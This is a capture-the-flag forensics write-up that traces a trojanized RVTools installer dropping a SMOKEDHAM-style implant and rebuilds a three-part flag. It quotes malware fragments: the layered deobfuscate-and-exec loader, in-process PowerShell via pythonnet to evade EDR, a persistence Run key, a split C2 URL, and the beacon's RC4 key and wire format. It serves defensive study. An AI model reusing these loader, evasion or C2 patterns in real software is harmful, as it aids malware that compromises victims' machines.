---
title: 'UNCXXXX'
description: 'A trojanized RVTools installer infects a Windows workstation. Triage the disk image, trace the SMOKEDHAM kill chain across bytecode, PowerShell, a C2 capture, and OSINT to rebuild a 3-part flag.'
pubDate: 2026-06-28
draft: false
event: 'Mntcrl CTF 2026'
category: 'forensics'
difficulty: 'medium'
flagFormat: 'mntcrl{...}'
tags: ['forensics', 'disk-forensics', 'malware-analysis', 'network-forensics', 'osint', 'smokedham', 'reversing']
---

> **WARNING - MALWARE.** This challenge ships a forensic image of a compromised Windows workstation. The image contains real malware samples collected during an active incident response engagement, partially sanitized and repurposed for this CTF. Do **not** execute any of the files outside an isolated, sandboxed environment.

> An endpoint on a corporate network started behaving oddly shortly after an employee downloaded what appeared to be a legitimate VMware infrastructure management tool from what looked like the official vendor page. The IR team imaged the workstation's system drive before the host was rebuilt, and captured network traffic just before it was isolated. Triage the image, find the root cause, reconstruct the kill chain, and name the group behind it. The flag is split into three parts across the provided artifacts and open-source intelligence.

## Overview

The challenge provides two artifacts:

- `uncxxxx.vhdx`: a forensic image of the compromised workstation's system drive (Windows 10, host `WS-FIN-07`, user `dvargas`)
- `UNCXXXX.pcapng`: a network capture taken during dynamic analysis before the host was isolated

The disk is a realistic, lived-in system: the user's documents, pictures, browser history and installed software sit alongside the intrusion artifacts and several deliberate **decoys**, including `passwords.txt`, `secret_project.zip`, a base64 `config.b64` that decodes to a taunt, a benign `totally_legit.exe`, the legitimate RVTools installer (`rvtools.msi`), a second near-identical payload `LICENSE1.txt` that beacons to a different, dead C2, and the renamed Python interpreter `UsbService86.exe`. Reversing the decoys is a rabbit hole. The first job is disk triage: separate signal from noise and locate the implant.

The flag is split across **three** sources:

- **Part 1** buried in the C# payload, reached after fully tracing the kill chain from the implant on disk
- **Part 2** encrypted in the C2 response inside `UNCXXXX.pcapng`
- **Part 3** obtained via OSINT on the threat actor cluster

## Step 0 Disk triage: find the root cause

Mount the image read-only (`uncxxxx.vhdx` attaches natively on Windows; on Linux use `qemu-nbd` / `libguestfs`; Autopsy, FTK Imager or `MFTECmd` work on the NTFS volume). Three independent trails converge on the implant.

**Initial access (browser).** `dvargas`'s Edge history (`Users\dvargas\AppData\Local\Microsoft\Edge\User Data\Default\History`) shows a Google search for `rvtools download`, a click on a sponsored ad (`googleadservices` -> `rv-tool.net`), and a download of `RVTools_4.7.0_x64.exe` from `download.rv-tool.net`. The fake vendor page is the **root cause**. The downloaded installer is still in `Users\dvargas\Downloads\` (a temp copy sits in the Recycle Bin), and `Recent\RVTools_4.7.0_x64.exe.lnk` confirms the user opened it. Extracting that NSIS installer (7-Zip, internal name `RVTools-Executor`) reveals the implant bundled inside: `UsbService86.exe`, `LICENSE.txt`, the full Python 3.12 runtime (`pythonnet`), and the legitimate `rvtools.msi` decoy, confirming it as the dropper.

**Persistence (registry).** The `SOFTWARE` hive (`Windows\System32\config\SOFTWARE`) carries a Run key:

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\UpdateWINPY =
  C:\ProgramData\Microsoft\AppUpdate\SystemInfo\UsbService86.exe
  C:\ProgramData\Microsoft\AppUpdate\SystemInfo\LICENSE.txt
```

It points straight at the implant directory and shows exactly how it is launched.

**Execution (prefetch / event logs).** `Windows\Prefetch\USBSERVICE86.EXE-*.pf` confirms the interpreter ran; the event logs under `Windows\System32\winevt\Logs\` (PowerShell `4104` script-block logging) show the beacon to `ctf-unc.proxy-edge-c5f.workers.dev` and capture the deobfuscated PowerShell stage, so the C2 URL and RC4 key are recoverable from the host too. Note the `4104` events are attributed to `UsbService86.exe`, not `powershell.exe`: the implant hosts the runspace in-process via `pythonnet`, exactly the EDR-evasion behaviour described for SMOKEDHAM.

All three lead to `C:\ProgramData\Microsoft\AppUpdate\SystemInfo\` (and an identical copy under `SystemWEB\SystemInfo\`), a folder masquerading as a Microsoft update path, which contains:

- `UsbService86.exe`: a renamed Python 3.12 interpreter, alongside the full embeddable runtime (`python312.dll`/`.zip`, and the `pythonnet` stack loaded via `Unicode.Data.Automation.dll`, `clr.py`, `Python.Runtime.dll`)
- `LICENSE.txt`: the malicious compiled-bytecode payload (analyzed below)
- `LICENSE1.txt`: a second, near-identical payload run directly by the installer; it is byte-different, beacons to a **different, dead** C2 (`rapid.data-pipeline-9e4.workers.dev`) and carries no flag, a decoy. The pcap (traffic only to `ctf-unc...`) and the Run key (which points at `LICENSE.txt`) tell you which payload actually ran.
- `cert.txt`: an empty mutex/marker file dropped by the installer
- `SystemWEB\rvtools.msi`: the legitimate RVTools installer, dropped as the decoy the victim actually sees

From here the analysis follows the implant itself.

## Step 1 Identify LICENSE.txt as a compiled Python bytecode file

Despite the `.txt` extension, `file` immediately reveals the true nature of the artifact:

```bash
$ file LICENSE.txt
LICENSE.txt: python 3.12 byte-compiled
```

Alternatively, inspecting the first 4 bytes (the magic number):

```bash
$ xxd LICENSE.txt | head -1
00000000: cb0d 0d0a ...
```

`0xcb0d0d0a` is the magic number for **Python 3.12**.

## Step 2 Decompile the bytecode

Standard decompilers like `uncompyle6` do not support Python 3.12. The correct tool is `pycdc` (Decompyle++):

```bash
$ git clone https://github.com/zrax/pycdc && cd pycdc
$ cmake . && make
$ ./pycdc LICENSE.txt
```

The output reveals approximately 20 identically structured functions with randomized names, junk code used to obstruct analysis. The relevant logic is at the bottom of the module:

```python
ojftlbeq = '52573b...'   # long hex string
ellebher = 111
pbjtggmb = bytes.fromhex(ojftlbeq)
qnrwdfky = bytes(b ^ ellebher for b in pbjtggmb)[::-1]
mvxjgnny = zlib.decompress(base64.b64decode(qnrwdfky))
exec(mvxjgnny.decode('utf-8'))
```

Alternatively, the module-level bytecode can be traced with Python's `dis` module:

```python
import marshal, dis

with open('LICENSE.txt', 'rb') as f:
    f.read(16)
    code = marshal.loads(f.read())

dis.dis(code)
```

## Step 3 Reconstruct the deobfuscation chain

The chain applied to the hex blob is:

```
bytes.fromhex() -> XOR each byte with 111 -> reverse -> base64 decode -> zlib decompress -> exec()
```

Replicating it in Python:

```python
import base64, zlib, marshal

with open('LICENSE.txt', 'rb') as f:
    f.read(16)
    code = marshal.loads(f.read())

hex_str      = next(c for c in code.co_consts if isinstance(c, str) and len(c) > 100)
raw          = bytes.fromhex(hex_str)
xored        = bytes(b ^ 111 for b in raw)
reversed_b   = xored[::-1]
decompressed = zlib.decompress(base64.b64decode(reversed_b))

print(decompressed.decode('utf-8'))
```

## Step 4 Analyze the extracted Python payload

The decompressed payload is a Python stage-2 loader that uses `pythonnet` (`clr`) to instantiate a PowerShell runspace and execute an embedded script:

```python
import clr
from System.Management.Automation import PowerShell

ps = PowerShell.Create()
ps_script = """ ... """
ps.AddScript(ps_script)
ps.Invoke()
```

Two critical pieces of information are recoverable from this stage:

- **RC4 key** (visible in the PowerShell script): `sgHDLwbfskesAXRtOPSWUhYp`
- **C2 URL** (reconstructed from split variables): `https://ctf-unc.proxy-edge-c5f.workers.dev/`

The C2 URL is intentionally obfuscated by splitting it across multiple variables mirroring the original malware's technique:

```powershell
$var4_part0 = "https";$var4_part1 = "://ct";$var4_part2 = "f-unc";
$var4_part3 = ".prox";$var4_part4 = "y-edg";$var4_part5 = "e-c5f";
$var4_part6 = ".work";$var4_part7 = "ers.d";$var4_part8 = "ev/";
$var4 = $var4_part0 + $var4_part1 + ... + $var4_part8
```

## Step 5 Analyze the PowerShell stage

The embedded PowerShell script mirrors the real SMOKEDHAM structure:

```powershell
sleep 60;
[Byte[]]$tH9Sc68QhPJf = 33,85,37,197,...   # AES-256 key (32 bytes)
$zg24VWBSMlJy = "76492d1116743f0423413b16050a5345MgB8A..."  # encrypted blob
```

The blob uses the PowerShell `ConvertFrom-SecureString` serialization format:

```
76492d1116743f0423413b16050a5345  ->  PS SecureString header
MgB8A<base64 IV>|<hex ciphertext>  ->  AES-CBC encrypted payload
```

To decrypt it:

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

aes_key = bytes([33,85,37,197,151,218,246,80,
                 176,208,198,231,79,4,54,40,
                 227,86,50,200,130,188,103,161,
                 57,38,161,160,105,70,134,75])

# Strip the PS header and "MgB8A" prefix, then split IV and ciphertext
blob     = "$zg24VWBSMlJy value here"
stripped = blob[len("76492d1116743f0423413b16050a5345MgB8A"):]
iv_b64, ct_hex = stripped.split("|", 1)

iv  = base64.b64decode(iv_b64)
ct  = bytes.fromhex(ct_hex)
cs  = unpad(AES.new(aes_key, AES.MODE_CBC, iv).decrypt(ct), 16).decode()
print(cs)  # C# source code
```

The decrypted content is the C# source of the final payload, compiled in-memory via `Add-Type`.

## Step 6 Analyze the C# payload

The decrypted C# source defines a backdoor under namespace `pmemR`, class `CNTPxHLpv`, method `XPPhGJ`. Reading through the source, `FLAG_P1` is found buried in the `SessionManager` class as an inline comment:

```csharp
internal class SessionManager {
    // build-id: mntcrl{wh0_0rd3r3d_
    private static readonly string _buildTag = "b1d3f9a2c4e6f8a0b2d4e6f8a0b2d4e6";
    ...
}
```

**Flag Part 1:** `mntcrl{wh0_0rd3r3d_`

## Step 7 Analyze the network capture

Open `UNCXXXX.pcapng` in Wireshark. The capture contains heavy background traffic (Windows telemetry, OneDrive, Windows Update, OCSP), totalling 279 packets over ~68 seconds.

To isolate the relevant session, filter by the C2 domain found in Step 4:

```
http and http.host == "ctf-unc.proxy-edge-c5f.workers.dev"
```

Or filter by IP:

```
ip.addr == 104.21.37.91
```

The client sends a `POST /` request with a JSON body:

```json
{
  "UUID": "...",
  "ID": "4E2A1F8C",
  "Data": "<base64 blob>"
}
```

The server responds with HTTP 200:

```json
{
  "UUID": "...",
  "ID": "4E2A1F8C",
  "Data": "VIsLljLk+y+3vzey7Z0="
}
```

The `Data` field in the **response** contains the encrypted second part of the flag.

## Step 8 Decrypt the C2 response

The `Data` field is encoded as `base64(RC4(key, plaintext))`. Using the RC4 key from Step 4:

```python
import base64

def rc4(key, data):
    key = key.encode() if isinstance(key, str) else key
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

RC4_KEY  = "sgHDLwbfskesAXRtOPSWUhYp"
data_b64 = "VIsLljLk+y+3vzey7Z0="

plaintext = rc4(RC4_KEY, base64.b64decode(data_b64)).decode()
print(plaintext)  # th3_5m0k3dh4m_
```

**Flag Part 2:** `th3_5m0k3dh4m_`

The trailing `_` indicates there is a third part to find.

## Step 9 OSINT on the threat actor cluster

The C2 uses `workers.dev` infrastructure, a Cloudflare-based hosting service increasingly abused for C2 due to its legitimate reputation and difficulty of blocking. Cross-referencing the observable TTPs against public threat intelligence surfaces a consistent picture:

- The multi-stage Python loader delivered via trojanized NSIS installer mirrors the initial access pattern documented by Mandiant in 2021 for **UNC2465**, a threat cluster with historical ties to DarkSide ransomware affiliates.
- The use of `pythonnet` to instantiate a PowerShell runspace without spawning `powershell.exe` is a documented defense evasion technique consistent with SMOKEDHAM's tradecraft, designed to bypass EDR telemetry that monitors process creation.
- The AES-256 `ConvertFrom-SecureString` blob containing a C# payload compiled in-memory via `Add-Type` is structurally identical to the final stage described in the Mandiant and ConnectWise reports.
- The C2 protocol envelope with `UUID`, `ID`, and RC4+Base64-encrypted `Data` field matches the wire format of **SMOKEDHAM** (MITRE ATT&CK S0649) as documented across multiple independent analyses.
- The `workers.dev` C2 infrastructure, the RVTools lure, and the NSIS packaging are all consistent with a campaign cluster tracked through 2025-2026 distributing SMOKEDHAM via Search Engine Malvertising, as reported by Field Effect, Varonis, Synacktiv, and BleepingComputer.

Taken together, these overlaps support attribution to **UNC2465** with high confidence at the TTP level, while infrastructure attribution remains limited without additional pivot points.

Relevant public sources:

- [Mandiant - DarkSide Affiliate Supply Chain](https://cloud.google.com/blog/topics/threat-intelligence/darkside-affiliate-supply-chain-software-compromise/)
- [MITRE ATT&CK S0649 - SMOKEDHAM](https://attack.mitre.org/software/S0649/)
- [TRAC Labs - Who Ordered the SMOKEDHAM Backdoor](https://medium.com/trac-labs/who-ordered-the-smokedham-backdoor-delicacies-in-the-wild-87f51e2e5bd2)

The numeric identifier of the UNC cluster is **2465**.

**Flag Part 3:** `2465}`

## Putting it together

```text
mntcrl{wh0_0rd3r3d_  +  th3_5m0k3dh4m_  +  2465}
```

**Flag:** `mntcrl{wh0_0rd3r3d_th3_5m0k3dh4m_2465}`

## Background

The artifact is a reconstruction of a real-world implant observed in a malvertising campaign distributing SMOKEDHAM (MITRE S0649), attributed to UNC2465. The threat actor abused sponsored search results to redirect victims to fake download pages for legitimate VMware infrastructure tooling, delivering a trojanized NSIS installer that dropped a Python-based implant alongside the legitimate software as a decoy. The obfuscation pattern, the use of `pythonnet` to invoke PowerShell without spawning `powershell.exe`, the AES-256 in-memory C# compilation, and the Cloudflare Workers C2 infrastructure are all consistent with publicly documented tradecraft for this cluster.
